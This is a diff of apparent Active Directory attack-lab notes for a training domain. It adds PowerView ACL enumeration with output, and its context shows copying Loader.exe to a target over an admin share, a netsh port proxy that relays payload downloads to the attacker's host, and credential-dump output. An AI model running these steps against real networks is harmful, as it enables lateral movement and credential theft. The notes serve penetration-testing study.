@@ -15,9 +15,68 @@
   2. [Abuse Permissions](#abuse-permissions)
   3. [Extract Secrets](#extract-secrets)
 
+
+
+```
+ Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceClass -like '*omputer*' } | select ObjectDN, ActiveDirectoryRights, IdentityReferenceName | FT
+
+ PS C:\Users\studentuser12> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceClass -like '*omputer*' } | select ObjectDN, ActiveDirectoryRights, IdentityReferenceName | FT
+WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-210670787-2521448726-163245708-1147' to a distinguishedname with Convert-ADName
+WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-210670787-2521448726-163245708-1147' to a distinguishedname with Convert-ADName
+WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-210670787-2521448726-163245708-1147' to a distinguishedname with Convert-ADName
+
+ObjectDN                                                                       ActiveDirectoryRights IdentityReferenceName
+--------                                                                       --------------------- ---------------------
+CN=Windows Virtual Machine,CN=US-JUMP,OU=PAW,DC=us,DC=techcorp,DC=local                   GenericAll US-JUMP$
+CN=Windows Virtual Machine,CN=STUDENT11,OU=Students,DC=us,DC=techcorp,DC=local            GenericAll STUDENT11$
+CN=Windows Virtual Machine,CN=STUDENT12,OU=Students,DC=us,DC=techcorp,DC=local            GenericAll STUDENT12$
+CN=Windows Virtual Machine,CN=STUDENT13,OU=Students,DC=us,DC=techcorp,DC=local            GenericAll STUDENT13$
+CN=Windows Virtual Machine,CN=STUDENT14,OU=Students,DC=us,DC=techcorp,DC=local            GenericAll STUDENT14$
+CN=Windows Virtual Machine,CN=STUDENT15,OU=Students,DC=us,DC=techcorp,DC=local            GenericAll STUDENT15$
+CN=Windows Virtual Machine,CN=STUDENT16,OU=Students,DC=us,DC=techcorp,DC=local            GenericAll STUDENT16$
+CN=Windows Virtual Machine,CN=STUDENT17,OU=Students,DC=us,DC=techcorp,DC=local            GenericAll STUDENT17$
+CN=Windows Virtual Machine,CN=STUDENT18,OU=Students,DC=us,DC=techcorp,DC=local            GenericAll STUDENT18$
+CN=Windows Virtual Machine,CN=STUDENT19,OU=Students,DC=us,DC=techcorp,DC=local            GenericAll STUDENT19$
+CN=Windows Virtual Machine,CN=STUDENT20,OU=Students,DC=us,DC=techcorp,DC=local            GenericAll STUDENT20$
+CN=Windows Virtual Machine,CN=STUDENT21,OU=Students,DC=us,DC=techcorp,DC=local            GenericAll STUDENT21$
+CN=Windows Virtual Machine,CN=STUDENT22,OU=Students,DC=us,DC=techcorp,DC=local            GenericAll STUDENT22$
+CN=Windows Virtual Machine,CN=STUDENT23,OU=Students,DC=us,DC=techcorp,DC=local            GenericAll STUDENT23$
+CN=Windows Virtual Machine,CN=STUDENT24,OU=Students,DC=us,DC=techcorp,DC=local            GenericAll STUDENT24$
+CN=Windows Virtual Machine,CN=STUDENT25,OU=Students,DC=us,DC=techcorp,DC=local            GenericAll STUDENT25$
+CN=Windows Virtual Machine,CN=STUDENT26,OU=Students,DC=us,DC=techcorp,DC=local            GenericAll STUDENT26$
+CN=Windows Virtual Machine,CN=STUDENT27,OU=Students,DC=us,DC=techcorp,DC=local            GenericAll STUDENT27$
+CN=Windows Virtual Machine,CN=STUDENT28,OU=Students,DC=us,DC=techcorp,DC=local            GenericAll STUDENT28$
+CN=Windows Virtual Machine,CN=STUDENT29,OU=Students,DC=us,DC=techcorp,DC=local            GenericAll STUDENT29$
+CN=Windows Virtual Machine,CN=STUDENT30,OU=Students,DC=us,DC=techcorp,DC=local            GenericAll STUDENT30$
+CN=Windows Virtual Machine,CN=STUDENT1,OU=Students,DC=us,DC=techcorp,DC=local             GenericAll STUDENT1$
+CN=Windows Virtual Machine,CN=US-EXCHANGE,CN=Computers,DC=us,DC=techcorp,DC...            GenericAll US-EXCHANGE$
+CN=Windows Virtual Machine,CN=US-HELPDESK,CN=Computers,DC=us,DC=techcorp,DC...            GenericAll US-HELPDESK$
+CN=Windows Virtual Machine,CN=US-MSSQL,CN=Computers,DC=us,DC=techcorp,DC=local            GenericAll US-MSSQL$
+CN=Windows Virtual Machine,CN=US-WEB,CN=Computers,DC=us,DC=techcorp,DC=local              GenericAll US-WEB$
+CN=Windows Virtual Machine,CN=US-ADCONNECT,CN=Computers,DC=us,DC=techcorp,D...            GenericAll US-ADCONNECT$
+CN=DFSR-LocalSettings,CN=US-DC,OU=Domain Controllers,DC=us,DC=techcorp,DC=l...            GenericAll US-DC$
+CN=Domain System Volume,CN=DFSR-LocalSettings,CN=US-DC,OU=Domain Controller...            GenericAll US-DC$
+CN=SYSVOL Subscription,CN=Domain System Volume,CN=DFSR-LocalSettings,CN=US-...            GenericAll US-DC$
+CN=Windows Virtual Machine,CN=US-MAILMGMT,OU=MailMgmt,DC=us,DC=techcorp,DC=...            GenericAll US-MAILMGMT$
+CN=Windows Virtual Machine,CN=US-MGMT,OU=Mgmt,DC=us,DC=techcorp,DC=local                  GenericAll US-MGMT$
+```
+
+```
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceClass -like '*user*' -and ($_.IdentityReferenceName -ne 'MSOL_16fb75d0227d')  } | select ObjectDN, ActiveDirectoryRights, IdentityReferenceName |
+FT
+WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-210670787-2521448726-163245708-1147' to a distinguishedname with Convert-ADName
+WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-210670787-2521448726-163245708-1147' to a distinguishedname with Convert-ADName
+WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-210670787-2521448726-163245708-1147' to a distinguishedname with Convert-ADName
+
+ObjectDN                                                                  ActiveDirectoryRights IdentityReferenceName
+--------                                                                  --------------------- ---------------------
+CN=US-HELPDESK,CN=Computers,DC=us,DC=techcorp,DC=local ListChildren, ReadProperty, GenericWrite mgmtadmin
+```
+
+
 Extract credentials from us-mgmt machine:
 
-copy Loader.ex fromm attacker machine to target machine:
+copy Loader.exe fromm attacker machine to target machine:
 ```
 C:\Windows\system32>echo F | xcopy C:\AD\Tools\Loader.exe \\us-mgmt\C$\Users\Public\Loader.exe /Y
 Does \\us-mgmt\C$\Users\Public\Loader.exe specify a file name
@@ -37,7 +96,7 @@ Microsoft Windows [Version 10.0.17763.3650]
 create port proxy:
 ```
 C:\Users\studentuser17>netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.17
-netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.17
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8989 connectaddress=192.168.100.12
 
 ```
 
@@ -415,7 +474,7 @@ Authentication Id : 0 ; 25459565 (00000000:01847b6d)
 Session           : Interactive from 3
 User Name         : DWM-3
 Domain            : Window Manager
-Logon Server      : (null)
+Logon Server      : (null)..
 Logon Time        : 2/20/2023 11:09:50 AM
 SID               : S-1-5-90-0-3
 
